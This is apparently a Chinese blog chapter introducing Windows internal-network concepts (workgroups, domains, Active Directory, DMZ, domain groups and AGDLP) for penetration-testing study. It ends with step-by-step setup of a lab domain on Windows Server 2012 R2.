+<li><p>内网也指局域网（Local Area Network LAN）是指某一区域内多台计算机互联组成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组的历程安排、电子邮件和传真通信服务等功能。</p>
+</li>
+<li><p>内网是封闭型的，可以由办公室内两台计算机组成，也可以由一个公司内几千台计算机组成。例如：银行、学校、企业、政府机关、单位办公网等都属于此类</p>
+</li>
+</ul>
+<p>我们在研究内网的时候，经常会听到一些例如 “工作组”、”域”、”域控制器(DC)”、”父域”、”子域” 、域树”、”域森林”、”活动目录(AD)”、”DMZ”、”域内权限” 等等专有名词  它们指的是什么呢？又有什么区别呢？</p>
+<h2 id="1-工作组"><a href="#1-工作组" class="headerlink" title="(1) 工作组"></a>(1) 工作组</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>Work Group：在一个大的单位里，可能有上千台电脑互相组成局域网。他们列在网络内，如果这些电脑不分组，会十分混乱，要找一台电脑很困难。 和我们的下载的软件分类差不多，不分组的话找起来会很困难。为了解决这个问题，有了”工作组”的概念。 我们将不同的电脑按功能（或部门）分别列入不同的工作组中。你要访问哪个部门资源，直接在”网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。这样相比于不分组的情况，对那种大型网络来说，会变得十分有序</p>
+<p><img src="/2023/09/20/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/3074366-20230213162534053-1645630015.png"></p>
+<h3 id="2-加入-创建工作组"><a href="#2-加入-创建工作组" class="headerlink" title="2. 加入&#x2F;创建工作组"></a>2. 加入&#x2F;创建工作组</h3><ul>
+<li><p>右键桌面上的”计算机”，弹出的菜单里选择”属性”，点击”更改设置”，”更改” 在”计算机名”一栏输入你想好的名称，在”工作组”一栏输入你想要加入的工作组名称</p>
+</li>
+<li><p>如果你输入的工作组名称网络中没有，那么相当于新建了一个工作组，当然暂时只有你的电脑在组内，重新启动之后，再点击进入”网络”，就可以看到你所加入的工作组成员了</p>
+</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230213192515480-349103243.png"></p>
+<h3 id="3-退出工作组"><a href="#3-退出工作组" class="headerlink" title="3. 退出工作组"></a>3. 退出工作组</h3><ul>
+<li><p>只要将工作组名称改动即可。不过在网上别人照样可以访问你的共享资源。你也可以随便加入同一网络上的任何其他工作组。”工作组”就像一个可以自由进入和退出的”社团”，方便同一组的计算机互相访问。</p>
+</li>
+<li><p><strong>所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的。</strong></p>
+</li>
+</ul>
+<h3 id="4-一个问题"><a href="#4-一个问题" class="headerlink" title="4. 一个问题"></a>4. 一个问题</h3><p>假如一个公司有200台电脑，我们希望某台电脑上的账户Alan可以访问每台电脑内的资源或者可以在每台电脑上登录。那么在”工作组”环境中，我们必须要在这200台电脑的各个SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须要更改200次！现在只是200台电脑的公司，如果是有5000台电脑或者上万台电脑的公司呢？</p>
+<p>估计管理员会抓狂，等我们看完下面的 域 和 活动目录 ，就可以有更好的办法了。</p>
+<h2 id="2-域"><a href="#2-域" class="headerlink" title="(2) 域"></a>(2) 域</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1. 概念"></a>1. 概念</h3><p><strong>域（Domain）是一个有安全边界的计算机集合</strong>（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，<strong>如果你想访问域内的资源，必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份</strong></p>
+<p><strong>域控制器（Domain Controller，即DC）是一个域中的一台类似管理服务器的计算机</strong>，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。<strong>即验证用户的身份</strong></p>
+<ul>
+<li><p>域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算机连接到域时，域控制器首先要鉴别这台计算机是否属于这个域，以及用户使用的登陆账号是否存在、密码是否正确。若以上信息不正确则拒绝这台计算机的登陆，进而不能访问服务器中的资源。因而DC是十分重要的。</p>
+</li>
+<li><p><strong>域控制器是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，即域内所有用来验证过身份的账号和密码hash散列值都保存在域控制器中。内网渗透的目的就是为了获得域控制器 安全域划分</strong></p>
+</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215141207540-1415183280.png"></p>
+<p>这里就是两个边界，两个域。如果那个电子商务服务器，想访问里面那个域的服务器，需要有一个合法的身份登入那个域中。</p>
+<h3 id="2-域的分类"><a href="#2-域的分类" class="headerlink" title="2. 域的分类"></a>2. 域的分类</h3><p>单域 父域，子域 域树（tree） 域森林（forest） DNS域名服务器</p>
+<h4 id="2-1-单域"><a href="#2-1-单域" class="headerlink" title="2.1 单域"></a>2.1 单域</h4><ul>
+<li><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
+</li>
+<li><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
+</li>
+</ul>
+<h4 id="2-2-父域"><a href="#2-2-父域" class="headerlink" title="2.2 父域"></a>2.2 父域</h4><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
+<ul>
+<li><p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
+</li>
+<li><p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
+</li>
+<li><p>还有一个好处，就是<strong>子公司可以通过自己的域来管理自己的资源</strong>。将对应部门规划为一个域，公司则是一个域树。</p>
+</li>
+<li><p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
+</li>
+</ul>
+<h4 id="2-3域树"><a href="#2-3域树" class="headerlink" title="2.3域树"></a>2.3域树</h4><p><strong>域树指若干个域通过建立信任关系组成的集合。</strong>一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立<strong>信任关系（Trust Relation）</strong>。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
+<ul>
+<li>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</li>
+<li>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。<strong>子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的</strong></li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215143407176-499013329.png"></p>
+<h4 id="2-4-域森林"><a href="#2-4-域森林" class="headerlink" title="2.4 域森林"></a>2.4 域森林</h4><p><strong>域森林指若干个 域树 通过建立信任关系组成的集合。</strong>可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。比如：这里域树abc.com与域树abc.net之间通过建立信任关系来构成域森林</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215143632525-1901653293.png"></p>
+<h4 id="2-5-DNS域名服务器-Domain-Name-Server"><a href="#2-5-DNS域名服务器-Domain-Name-Server" class="headerlink" title="2.5 DNS域名服务器(Domain Name Server)"></a>2.5 DNS域名服务器(Domain Name Server)</h4><p>DNS域名服务器是进行域名（domain name）和与之相对应的IP地址（IP address）转换的服务器。</p>
+<ul>
+<li><p>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，<strong>因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</strong></p>
+</li>
+<li><p>一般情况下，我们在内网渗透时就通过 <strong>寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</strong></p>
+</li>
+</ul>
+<h2 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="(3) 活动目录"></a>(3) 活动目录</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1. 概念"></a>1. 概念</h3><p><strong>活动目录（Active Directory，即AD）是域环境中提供目录服务的组件。</strong></p>
+<p>目录是什么？</p>
+<ul>
+<li><p>目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p>
+</li>
+<li><p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
+</li>
+</ul>
+<h3 id="2-逻辑结构"><a href="#2-逻辑结构" class="headerlink" title="2.逻辑结构"></a>2.逻辑结构</h3><ul>
+<li>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构“。</li>
+<li>活动目录的逻辑结构就包括上面讲到的<strong>组织单元（OU）、域（domain）、域树（tree）、域森林（forest）</strong>。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li>
+</ul>
+<p>例：A集团下有甲 乙 丙三家子公司，为了A集团更好的管理这三家公司，可以将这三家公司的域树集中起来组成域森林。A集团可以按照 <strong>“A集团（域森林）-&gt;子公司（域树）-&gt;部门（域）-&gt;员工”</strong> 的方式对网络进行层次分明的管理。可以使企业网络具有较强的可扩展性，便于进行组织、管理及目录定位。</p>
+<h3 id="3-活动目录-AD-主要功能"><a href="#3-活动目录-AD-主要功能" class="headerlink" title="3.活动目录(AD)主要功能"></a>3.活动目录(AD)主要功能</h3><ol>
+<li><p>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令&#x2F;重置密码。</p>
+</li>
+<li><p>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</p>
+</li>
+<li><p>环境集中管理，利用AD可以统一客户端桌面，IE，TCP&#x2F;IP等设置。</p>
+</li>
+<li><p>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</p>
+</li>
+<li><p>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</p>
+</li>
+<li><p>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</p>
+</li>
+</ol>
+<h3 id="4-DC和AD的区别、联系"><a href="#4-DC和AD的区别、联系" class="headerlink" title="4. DC和AD的区别、联系"></a>4. DC和AD的区别、联系</h3><ul>
+<li><p>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</p>
+</li>
+<li><p>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把<strong>存放有活动目录数据库的计算机就称为DC</strong>。</p>
+</li>
+<li><p><strong>所以说我们要实现 域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</strong></p>
+</li>
+<li><p>DC的本质是一台计算机，AD的本质是提供目录服务的组件</p>
+</li>
+</ul>
+<h3 id="5-前面的工作组环境”问题-解决"><a href="#5-前面的工作组环境”问题-解决" class="headerlink" title="5. 前面的工作组环境”问题-解决"></a>5. 前面的工作组环境”问题-解决</h3><p>回顾一下之前的问题：</p>
+<p>假如一个公司有200台电脑，我们希望某台电脑上的账户Alan可以访问每台电脑内的资源或者可以在每台电脑上登录。那么在”工作组”环境中，我们必须要在这200台电脑的各个SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须要更改200次！现在只是200台电脑的公司，如果是有5000台电脑或者上万台电脑的公司呢？</p>
+<p>答案：</p>
+<p>在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。 </p>
+<p>学了域之后，这个问题解决是不是就很简单呢，当然这只是域的一个很基础的功能。</p>
+<h2 id="4-域相关概念"><a href="#4-域相关概念" class="headerlink" title="(4) 域相关概念"></a>(4) 域相关概念</h2><h3 id="1-安全域划分"><a href="#1-安全域划分" class="headerlink" title="1. 安全域划分"></a>1. 安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的 NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP&#x2F;网段、不允许访问哪些IP&#x2F;网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
+<p>内网安全策略级别最高，DMZ中等，外网则低一点。</p>
+<p>下图为中小型内网的安全区域划分，一个虚线框表示一个安全域（也是网络的边界，一般分为DMZ和内网），通过硬件防火墙的不同端口实现隔离。</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215141207540-1415183280.png"></p>
+<h3 id="2-DMZ"><a href="#2-DMZ" class="headerlink" title="2. DMZ"></a>2. DMZ</h3><p>网络一般大致可以分为三个区域：安全级别最高的内网；安全级别中等的DMZ；安全级别最低的外网。三个区域负责完成不同任务，因此需要设置不同的访问策略。</p>
+<p>如上图，两个防火墙之间的空间被称为DMZ。</p>
+<p>DMZ(demilitarized zone)的缩写，即”隔离区”，也称”非军事化区”。</p>
+<ul>
+<li><p>DMZ是<strong>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</strong></p>
+</li>
+<li><p>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</p>
+</li>
+<li><p>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡</p>
+</li>
+</ul>
+<h3 id="3-DMZ屏障功能"><a href="#3-DMZ屏障功能" class="headerlink" title="3. DMZ屏障功能"></a>3. DMZ屏障功能</h3><p>通过定义一些访问策略，实现DMZ区的屏障功能</p>
+<ul>
+<li><p>内网可以访问外网<br>内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p>
+</li>
+<li><p>内网可以访问DMZ<br>此策略使内网用户可以使用或者管理DMZ中的服务器。</p>
+</li>
+<li><p>外网不能访问内网<br>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如栗要访问，就要通过VPN方式来进行。 比如：最常见的校园网</p>
+</li>
+<li><p>外网可以访问DMZ<br>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMz需要由防火墙完成对外地址到服务器实际地址的转换。</p>
+</li>
+<li><p>DMZ不能访问内网<br>如不执行此策略，则当入侵者攻陷DMz时，内部网络将不会受保护。</p>
+</li>
+<li><p>DMZ不能访何外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p>
+</li>
+</ul>
+<p>内网又可分为办公区和核心区</p>
+<p> 办公区：公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区一般能够访问DMZ。</p>
+<p>核心区：存储企业最重要的数据、文档等信息资产，通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能访问。从外部是绝难访问核心区的。</p>
+<h3 id="4-域中计算机分类"><a href="#4-域中计算机分类" class="headerlink" title="4. 域中计算机分类"></a>4. 域中计算机分类</h3><p>分为 域控制器(DC)、成员服务器、客户机、独立服务器</p>
+<p>域控制器：</p>
+<ul>
+<li><p>域控制器用于管理所有的网络访问,包括登录服务器、访问共享目录和资源。域控制器中存储了域内所有的账户和策略信息,包括安全策略、用户身份验证信息和账户信息。</p>
+</li>
+<li><p>在网络中,可以有多台计算机被配置为域控制器，以分担用户的登录、访问等操作。多个域控制器可以一起工作,自动备份用户账户和活动目录数据。这样，即使部分域控制器瘫痪,网络访问也不会受到影响，提高了网络的安全性和稳定性</p>
+</li>
+</ul>
+<p>成员服务器 ：</p>
+<ul>
+<li><p>成员服务器是指<strong>安装了服务器操作系统并加入了域、但没有安装活动目录的计算机</strong></p>
+</li>
+<li><p>其主要任务是提供网络资源。成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等</p>
+</li>
+</ul>
+<p>客户机：</p>
+<ul>
+<li><p>域中的计算机可以是安装了其他操作系统的计算机,，用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。 之前安全域划分图里的 办公电脑就是客户机。</p>
+</li>
+<li><p>域用户账号通过域的安全验证后,即可访问网络中的各种资源</p>
+</li>
+</ul>
+<p>独立服务器：</p>
+<ul>
+<li>独立服务器是指<strong>安装了服务器操作系统但 并没有加入域、也没有安装活动目录的计算机</strong> 和域没什么关系。</li>
+<li>独立服务器可以创建工作组，也可以和网络上的其他计算机共享资源，因为和域没有关系，所以 活动目录(AD) 的这些资源它是无法享受的</li>
+</ul>
+<p><strong>注：</strong></p>
+<ul>
+<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
+<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器(装入一个AD)，也可以加入到某个域成为成员服务器。</li>
+</ul>
+<h3 id="5-域内权限解读"><a href="#5-域内权限解读" class="headerlink" title="5. 域内权限解读"></a>5. 域内权限解读</h3><h4 id="5-1-域本地组"><a href="#5-1-域本地组" class="headerlink" title="5.1 域本地组"></a>5.1 域本地组</h4><p>域本地组：<strong>多域用户访问单域资源（访问同一个域）。</strong>可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。</p>
+<ul>
+<li><strong>域本地组不能嵌套于其他组中。</strong></li>
+<li>它主要是<strong>用于授予位于本域资源的访问权限。</strong></li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215143407176-499013329.png"></p>
+<h4 id="5-2-全局组"><a href="#5-2-全局组" class="headerlink" title="5.2 全局组"></a>5.2 全局组</h4><p>全局组：<strong>单域用户访问多域资源（必须是同一个域里面的用户）。</strong>只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p>
+<p>有很多的全局组，可以把Domain Computers加入Domain Admins全局组中，但是不能加入到其他全局组的域中。<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230215165351023-1885225375.png"></p>
+<h4 id="5-3-全局组与域本地组区别"><a href="#5-3-全局组与域本地组区别" class="headerlink" title="5.3 全局组与域本地组区别"></a>5.3 全局组与域本地组区别</h4><p>全局组相当于域账号，可以在全局使用，域本地组相当于本地账号，只能本机上使用。</p>
+<p>下面我来举两个例子来进一步说明（以混合模式下为例）：</p>
+<p>例1：<strong>将用户张三（域帐号Z3）加入到域本地组administrators中，并不能使Z3对 非DC 的 域成员计算机 有任何特权，但若加入到全局组Domain Admins中，张三就是域管理员了，可以在全局使用，对域成员计算机是有特权的。</strong></p>
+<p>例2：只有在域的DC上，对资源（如：文件&#x2F;夹）设置权限，你可以指派域本地组administrators；但在非DC的域成员计算机上，你是无法设置域本地组administrators的权限的。因为它是<strong>域本地组，只能在该域DC上使用</strong></p>
+<h4 id="5-4-通用组"><a href="#5-4-通用组" class="headerlink" title="5.4 通用组"></a>5.4 通用组</h4><p>通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问</p>
+<p>通常用于不经常发生变化的用户。组成员信息保存在 GC 里。</p>
+<h4 id="5-5-AGDLP策略"><a href="#5-5-AGDLP策略" class="headerlink" title="5.5 AGDLP策略"></a>5.5 AGDLP策略</h4><ul>
+<li><p>A (account):用户帐户 </p>
+</li>
+<li><p>G (Global group):全局组 </p>
+</li>
+<li><p>DL (Domain local group):域本地组 </p>
+</li>
+<li><p>P (Permission许可):表示资源权限 </p>
+</li>
+<li><p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为与本地住分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易 </p>
+</li>
+<li><p>在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p>
+</li>
+</ul>
+<p>举个例子比如：有两个域，A和B，A中的5个财务人员和B中的3个财务人员都需要访问B中的“FINA”文件夹。这时，可以在B中建一个DL(域本地组)，因为DL的成员可以来自所有的域，然后把这8个人都加入这个DL，并把FINA的访问权赋给DL。这样做的坏处是什么呢？因为DL是在B域中，所以管理权也在B域，如果A域中的5 个人变成6个人，那只能A域管理员通知B域管理员，将DL的成员做一下修改，B域的管理员太累了。这时候，我们改变一下，在A和B域中都各建立一个全局组（G），然后在B域中建立一个DL，把这两个G都加入B域中的DL中，然后把FINA的访问权赋给 DL。哈哈，这下两个G组都有权访问FINA文件夹了，是吗？组嵌套造成权限继承嘛！这时候，两个G分布在A和B域中，也就是A和B的管理员都可以自己管理自己的G啦，只要把那5个人和3个人加入G中，就可以了！以后有任何修改，都可以自己做了，不用麻烦B域的管理员！这就是A-G-DL-P。</p>
+<p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
+<p>简单来说：</p>
+<ul>
+<li><p>域本地组：来自全林、作用于本域</p>
+</li>
+<li><p>全局组：来自本域、作用于全林</p>
+</li>
+<li><p>通用组：来自全林、作用于全林</p>
+</li>
+</ul>
+<h4 id="5-6-熟悉各个组"><a href="#5-6-熟悉各个组" class="headerlink" title="5.6 熟悉各个组"></a>5.6 熟悉各个组</h4><p>本地域组的权限：</p>
+<ul>
+<li><p>Administrators（管理员组）<br> admin管理员。。。。肯定重要</p>
+</li>
+<li><p>Remote Desktop Users（远程登录组）<br>授予组内成员远程登录的权限</p>
+</li>
+<li><p>Print Operators（打印机操作员组）<br>可以管理、建立、删除网络打印机</p>
+</li>
+<li><p>Account Operators（帐号操作员组）<br>可以创建和管理域中用户和组，并可以设置它的权限。但是它是不能更改管理员组的账号的</p>
+</li>
+<li><p>Server Operaters（服务器操作员组）<br>可以管理域服务器。可以建立、删除任何域服务器里的共享目录。关锁定服务器、变更服务器的时间、关闭域控制器等等</p>
+</li>
+<li><p>Backup Operators（备份操作员组） 在域控制器上执行备份，还原操作。也可以本地登录和关闭域控制器。</p>
+</li>
+</ul>
+<p>全局组、通用组的权限：</p>
+<ul>
+<li><p>Domain Admins（域管理员组）<br>域管理员、更别说了。对域内所有计算机都有管理权限。是最最重要的权限，一般来说域渗透是看重这个</p>
+</li>
+<li><p>Enterprise Admins（企业系统管理员组）<br>除了域管理员组，第二重要的组</p>
+</li>
+<li><p>Schema Admins（架构管理员组）<br>第三重要是架构管理员组。可以管理活动目录</p>
+</li>
+<li><p>Domain Users（域用户组）</p>
+</li>
+</ul>
+<h1 id="攻击主机平台与工具利用"><a href="#攻击主机平台与工具利用" class="headerlink" title="&lt;2&gt; 攻击主机平台与工具利用"></a>&lt;2&gt; 攻击主机平台与工具利用</h1><p>虚拟机三种模式：</p>
+<ul>
+<li><p>桥接模式：虚拟机在局域网中作为独立的主机，可以和局域网里其他机器相互访问</p>
+</li>
+<li><p>NAT模式：虚拟机借助物理机来上网，可以和物理机之间相互访问，除物理机之外其他机器是不能访问虚拟机的。但是虚拟机可以访问同网段的其他机器的(因为你物理机是可以访问其他电脑的，而它是借助物理机)。</p>
+</li>
+<li><p>Host-only模式：仅主机模式。在渗透测试实验中推荐用host-only模式，是三种模式中隐秘性最强、最严格的网络配置。虚拟机处于一个独立的网段，和物理机的ip段是分开来的。这个模式下虚拟机是不能上网的，主机和虚拟机可以互访</p>
+</li>
+</ul>
+<h2 id="1-域环境搭建"><a href="#1-域环境搭建" class="headerlink" title="(1) 域环境搭建"></a>(1) 域环境搭建</h2><p>下载操作系统的网站：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a><br>安装教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17131317.html">https://www.cnblogs.com/1vxyz/p/17131317.html</a></p>
+<h3 id="1-网络拓扑"><a href="#1-网络拓扑" class="headerlink" title="1. 网络拓扑"></a>1. 网络拓扑</h3><table>
+<thead>
+<tr>
+<th>操作系统</th>
+<th>安装服务</th>
+<th>计算机名称</th>
+<th>IP</th>
+<th>DNS服务器地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows server 2012 R2</td>
+<td>AD&#x2F;DC</td>
+<td>DC</td>
+<td>192.168.1.1</td>
+<td>192.168.1.1</td>
+</tr>
+<tr>
+<td>Windows7</td>
+<td>加入域</td>
+<td>WIN7</td>
+<td>192.168.1.2</td>
+<td>192.168.1.1</td>
+</tr>
+<tr>
+<td>Windows server 2008 R2</td>
+<td>加入域</td>
+<td>WEB</td>
+<td>192.168.1.3</td>
+<td>192.168.1.1</td>
+</tr>
+</tbody></table>
+<h3 id="2-域环境配置"><a href="#2-域环境配置" class="headerlink" title="2. 域环境配置"></a>2. 域环境配置</h3><p>操作流程：<br>Windows server 2012 R2<br>更改IP地址–&gt;更改计算机名–&gt;安装域控和DNS服务–&gt;升级服务器–&gt;创建AD域–&gt;创建用户</p>
+<p>windows server 2008 R2：<br>更改IP地址与DNS服务器地址–&gt;更改计算机名–&gt;加入域</p>
+<p>windows7：<br>更改IP地址与DNS服务器地址–&gt;更改计算机名–&gt;加入域</p>
+<h4 id="Windows-2012-R2设置★"><a href="#Windows-2012-R2设置★" class="headerlink" title="Windows 2012 R2设置★"></a>Windows 2012 R2设置★</h4><p>设置ip、更改计算机名、安装域控制器和DNS服务、升级服务器、创建Active Directory用户</p>
+<ul>
+<li>设置ip为192.168.1.1，子网掩码为255.255.255.0，DNS指向自己IP</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217195816583-882537746.png"></p>
+<ul>
+<li>更改计算机名称为DC</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217200218976-212723945.png"><br>然后会显示重新启动才会完成更改，我们重启。</p>
+<ul>
+<li>安装域控制器和DNS服务<br>在服务器管理器中，选择 添加角色和功能 -&gt; 默认下一步至服务器角色，点上 Active Directory域服务 与 DNS服务器</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217200836434-887355419.png"></p>
+<p>再默认下一步 至 确认，勾选上如果需要 自动启动目标服务器。安装即可</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217201112748-259323634.png"></p>
+<ul>
+<li><p>升级为域控制器<br>点击🚩旁边的⚠，点击 将此服务器升为域控制器 并且 添加新林，设置根域名为 hack.testlab<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217201432214-216019466.png"><br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217221254042-2117007947.png"></p>
+</li>
+<li><p>设置DSRM(目录还原模式)密码<br>这个密码是干什么用的呢？ 这个密码是我们开机进入安全模式，修复数据库的时候用的<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217221736879-1787813747.png"><br>点击下一步之后，会有一个什么DNS⚠ 不用理会它<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217222012010-416440387.png"></p>
+</li>
+<li><p>设置NetBIOS<br>这个NetBIOS域名是，比如不支持DNS的旧系统，比如win98 需要通过这个名来进行通讯，这里保持默认<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217222153442-1196783113.png"></p>
+</li>
+<li><p>设置路径<br>路径–指定数据库、日志、SYSVOL文件夹位置： 这里保持默认<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217222334602-2145896008.png"></p>
+</li>
+<li><p>安装AD域服务<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217222518242-347987575.png"></p>
+</li>
+</ul>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217222749009-421353531.png"></p>
+<p>重启完成之后，我们这个机器的administrator，也就随之变成了域管理员。可以看到登录界面的账户名也变了：<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217223102396-486875418.png"></p>
+<p>在那个服务器管理界面也就可以看见 AD、IDS、DNS等服务了</p>
